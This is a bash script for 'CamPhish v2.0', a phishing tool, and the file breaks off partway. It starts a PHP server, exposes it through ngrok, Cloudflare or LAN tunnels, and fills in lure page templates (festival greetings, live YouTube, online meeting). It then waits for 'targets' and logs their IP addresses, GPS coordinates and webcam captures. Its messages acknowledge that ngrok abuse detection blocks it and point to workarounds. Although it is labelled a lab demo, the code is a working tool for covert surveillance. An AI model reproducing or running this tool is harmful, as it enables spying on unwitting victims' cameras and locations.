#!/bin/bash
# CamPhish v2.0
# Powered by TechChip

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf " \e[1;96m Lab Demo by Tahir Siddique \e[0m \n"

printf "\n"


}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

get_cloudflare_link() {
local logfile="$1"
local link=""
if [[ ! -f "$logfile" ]]; then
return 1
fi
# Quick tunnel hostnames are random multi-part names, e.g. words-words-words.trycloudflare.com
link=$(grep -oE 'https://[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(grep -oE '[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
if [[ -n "$link" ]]; then
printf 'https://%s' "$link"
return 0
fi
return 1
}

wait_for_cloudflare_link() {
local logfile="$1"
local attempt=0
local link=""
while [[ $attempt -lt 30 ]]; do
link=$(get_cloudflare_link "$logfile")
if [[ -n "$link" ]]; then
printf "%s" "$link"
return 0
fi
sleep 2
attempt=$((attempt + 1))
done
return 1
}

cleanup_stale_servers() {
if [[ "$windows_mode" == true ]]; then
taskkill /F /IM "php.exe" 2>/dev/null
taskkill /F /IM "cloudflared.exe" 2>/dev/null
taskkill /F /IM "ngrok.exe" 2>/dev/null
else
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
pkill -f "cloudflared tunnel" > /dev/null 2>&1
pkill -f "ngrok http" > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
sleep 1
}

ngrok_config_path() {
if [[ "$windows_mode" == true ]]; then
printf "%s\\ngrok.yml" "$(pwd)"
else
printf "%s/ngrok.yml" "$(pwd)"
fi
}

ngrok_has_authtoken() {
local config_file="$1"
[[ -f "$config_file" ]] && grep -qE 'authtoken:[[:space:]]*[A-Za-z0-9_/-]+' "$config_file"
}

setup_ngrok_auth() {
local ngrok_bin="$1"
local config_file legacy_config
config_file=$(ngrok_config_path)

if ! ngrok_has_authtoken "$config_file"; then
for legacy_config in "$HOME/.config/ngrok/ngrok.yml" "$HOME/.ngrok2/ngrok.yml"; do
if ngrok_has_authtoken "$legacy_config"; then
cp "$legacy_config" "$config_file"
printf "\e[1;92m[\e[0m*\e[1;92m] Imported existing ngrok authtoken from %s\e[0m\n" "$legacy_config"
break
fi
done
fi

if ngrok_has_authtoken "$config_file"; then
printf "\e[1;93m[\e[0m*\e[1;93m] Using saved ngrok authtoken from %s\e[0m\n" "$config_file"
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Change ngrok authtoken? [y/N]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
"$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"
fi
return 0
fi

printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok v3 requires a free account authtoken (this is mandatory).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Sign up free and copy your token from:\e[0m\n"
printf "\e[1;77m    https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n\n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Paste your ngrok authtoken: \e[0m' ngrok_auth

if [[ -z "$ngrok_auth" ]]; then
printf "\e[1;31m[!] No authtoken provided. Ngrok cannot start without one.\e[0m\n"
return 1
fi

if ! "$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"; then
printf "\e[1;31m[!] Failed to save ngrok authtoken. Check the token and try again.\e[0m\n"
return 1
fi

if ! ngrok_has_authtoken "$config_file"; then
printf "\e[1;31m[!] Authtoken was not saved correctly in %s\e[0m\n" "$config_file"
return 1
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok authtoken saved successfully\e[0m\n"
return 0
}

get_ngrok_link() {
local api_response
api_response=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null)
if [[ -z "$api_response" ]]; then
return 1
fi
echo "$api_response" | grep -oE 'https://[a-zA-Z0-9.-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io)' | head -n1
}

wait_for_ngrok_link() {
local attempt=0
local link=""
while [[ $attempt -lt 30 ]]; do
link=$(get_ngrok_link)
if [[ -n "$link" ]]; then
printf "%s" "$link"
return 0
fi
if [[ -f ".ngrok.log" ]] && grep -qE "ERR_NGROK_8014|Acceptable Use policy|authentication failed" ".ngrok.log"; then
return 1
fi
sleep 2
attempt=$((attempt + 1))
done
return 1
}

show_ngrok_failure() {
if [[ -f ".ngrok.log" ]] && grep -q "ERR_NGROK_8014" ".ngrok.log"; then
printf "\e[1;31m[!] Ngrok blocked this account (ERR_NGROK_8014 — Acceptable Use Policy).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] This is NOT a university WiFi issue. Ngrok rejected the connection on their servers.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Phishing/security lab tools often trigger ngrok abuse detection.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] For your lab demo use option 03 (Local Network) instead.\e[0m\n"
printf "\e[1;77m    https://ngrok.com/docs/errors/err_ngrok_8014\e[0m\n"
return 0
fi
if [[ -f ".ngrok.log" ]] && grep -q "authentication failed" ".ngrok.log"; then
printf "\e[1;31m[!] Ngrok authentication failed — check your authtoken.\e[0m\n"
return 0
fi
return 1
}

get_local_ip() {
local ip=""
ip=$(hostname -I 2>/dev/null | awk '{print $1}')
if [[ -z "$ip" ]]; then
ip=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}')
fi
printf "%s" "$ip"
}

payload_site() {
link="$1"
if [[ -z "$link" || "$link" != http* ]]; then
printf "\e[1;31m[!] Invalid tunnel link — cannot generate pages.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Got: %s\e[0m\n" "$link"
exit 1
fi
sed "s+forwarding_link+${link}+g" template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
sed "s+fes_name+${fest_name}+g" index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed "s+forwarding_link+${link}+g" LiveYTTV.html > index3.html
sed "s+live_yt_tv+${yt_video_ID}+g" index3.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed "s+forwarding_link+${link}+g" OnlineMeeting.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
sed "s+forwarding_link+${link}+g" UWS.html > index3.html
sed "s+uws_site_url+${uws_site_url}+g" index3.html > index2.html
else
printf "\e[1;93m [!] Invalid template option!\e[0m\n"
exit 1
fi
rm -rf index3.html
}

check_cloudflared_config_conflict() {
local config_file=""
if [[ -f "$HOME/.cloudflared/config.yaml" ]]; then
config_file="$HOME/.cloudflared/config.yaml"
elif [[ -f "$HOME/.cloudflared/config.yml" ]]; then
config_file="$HOME/.cloudflared/config.yml"
fi
if [[ -n "$config_file" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] Found %s — this can block TryCloudflare quick tunnels.\e[0m\n" "$config_file"
printf "\e[1;93m[\e[0m!\e[1;93m] Temporarily renaming it for this session...\e[0m\n"
mv "$config_file" "${config_file}.camphish.bak"
cloudflared_config_backup="${config_file}.camphish.bak"
fi
}

restore_cloudflared_config() {
if [[ -n "$cloudflared_config_backup" && -f "$cloudflared_config_backup" ]]; then
mv "$cloudflared_config_backup" "${cloudflared_config_backup%.camphish.bak}"
cloudflared_config_backup=""
fi
}

cloudflared_bin() {
if [[ "$windows_mode" == true ]]; then
printf "./cloudflared.exe"
else
printf "./cloudflared"
fi
}

cloudflared_is_running() {
local pid=""
if [[ -f ".cloudflared.pid" ]]; then
pid=$(cat .cloudflared.pid 2>/dev/null)
if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
return 0
fi
fi
if pgrep -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1; then
return 0
fi
return 1
}

stop_cloudflared_only() {
if [[ -f ".cloudflared.pid" ]]; then
kill "$(cat .cloudflared.pid)" 2>/dev/null
rm -f .cloudflared.pid
fi
pkill -f "cloudflared tunnel.*127.0.0.1:3333" > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
sleep 1
}

verify_php_server() {
if command -v curl > /dev/null 2>&1; then
curl -s -o /dev/null -m 3 http://127.0.0.1:3333/ 2>/dev/null
return $?
fi
if command -v nc > /dev/null 2>&1; then
nc -z 127.0.0.1 3333 > /dev/null 2>&1
return $?
fi
sleep 1
return 0
}

start_cloudflared_tunnel() {
local cf_bin link proto attempt
cf_bin=$(cloudflared_bin)
rm -f .cloudflared.log .cloudflared.out .cloudflared.pid .tunnel.link
mkdir -p .camphish-cloudflared

for proto in auto http2 quic; do
stop_cloudflared_only

if [[ "$proto" == "auto" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\e[0m\n" >&2
nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info > .cloudflared.out 2>&1 &
else
printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto" >&2
nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url http://127.0.0.1:3333 --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
fi

echo $! > .cloudflared.pid
sleep 3

for attempt in $(seq 1 20); do
if ! cloudflared_is_running; then
break
fi
link=$(get_cloudflare_link ".cloudflared.out")
if [[ -n "$link" ]]; then
sleep 2
if cloudflared_is_running; then
printf '%s' "$link" > .tunnel.link
return 0
fi
break
fi
sleep 2
done
done

return 1
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
if [[ -f ".cloudflared.pid" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open or the Cloudflare tunnel will stop (Error 1033).\e[0m\n"
fi
while [ true ]; do

if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
printf "\n\e[1;31m[!] cloudflared stopped running! Tunnel is down (Error 1033).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Restart with: bash camphish.sh\e[0m\n"
rm -f .cloudflared.pid
fi

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] && ! ./cloudflared --version > /dev/null 2>&1; then
rm -f cloudflared cloudflared.exe
fi
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

cleanup_stale_servers
check_cloudflared_config_conflict

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

if ! verify_php_server; then
printf "\e[1;31m[!] PHP server failed to start on 127.0.0.1:3333\e[0m\n"
restore_cloudflared_config
exit 1
fi

if start_cloudflared_tunnel; then
link=$(cat .tunnel.link)
else
link=""
fi
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m cloudflared process crashed after starting\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m University/lab firewall may block port 7844 (TCP+UDP)\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try Ngrok instead (option 1) — often works better on campus networks\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test: ./cloudflared tunnel --url http://127.0.0.1:3333\e[0m\n"
if [[ -f ".cloudflared.out" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 15 lines):\e[0m\n"
tail -n 15 .cloudflared.out
fi
restore_cloudflared_config
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
printf "\e[1;77m    (Random *.trycloudflare.com URL — NOT api.trycloudflare.com)\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open — closing it stops the tunnel (Error 1033).\e[0m\n"
fi
payload_cloudflare "$link"
checkfound
}

payload_cloudflare() {
link="$1"
payload_site "$link"
}

payload_ngrok() {
link="$1"
payload_site "$link"
}

local_network_server() {
local local_ip link
cleanup_stale_servers

local_ip=$(get_local_ip)
if [[ -z "$local_ip" ]]; then
printf "\e[1;31m[!] Could not detect your local IP address.\e[0m\n"
exit 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on all interfaces (0.0.0.0:3333)...\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 &
sleep 2

if ! verify_php_server; then
printf "\e[1;31m[!] PHP server failed to start on port 3333\e[0m\n"
exit 1
fi

link="http://${local_ip}:3333"
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
printf "\e[1;93m[\e[0m!\e[1;93m] Local network mode — target must be on the SAME WiFi/LAN as this machine.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Best option for university lab demos when ngrok/cloudflare are blocked.\e[0m\n"
payload_site "$link"
checkfound
}

ngrok_server() {
if [[ -e ngrok ]] && ! ./ngrok version > /dev/null 2>&1; then
rm -f ngrok ngrok.exe
fi
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

cleanup_stale_servers

local ngrok_bin ngrok_config
if [[ "$windows_mode" == true ]]; then
ngrok_bin="./ngrok.exe"
else
ngrok_bin="./ngrok"
fi
ngrok_config=$(ngrok_config_path)

if ! setup_ngrok_auth "$ngrok_bin"; then
exit 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
rm -f .ngrok.log

"$ngrok_bin" http 127.0.0.1:3333 --config="$ngrok_config" --log=stdout > .ngrok.log 2>&1 &

link=$(wait_for_ngrok_link)
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating.\e[0m\n"
if ! show_ngrok_failure; then
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken may be missing or invalid\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Get a free token: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try option 03 (Local Network) for lab demos\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try manually: %s http 127.0.0.1:3333 --config=%s\e[0m\n" "$ngrok_bin" "$ngrok_config"
fi
if [[ -f ".ngrok.log" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] ngrok log (last 10 lines):\e[0m\n"
tail -n 10 .ngrok.log
fi
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
fi
payload_ngrok "$link"
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Local Network (Lab Demo)\e[0m\n"
default_option_server="3"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 3] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
elif [[ $option_server -eq 3 ]]; then
local_network_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

select_template() {
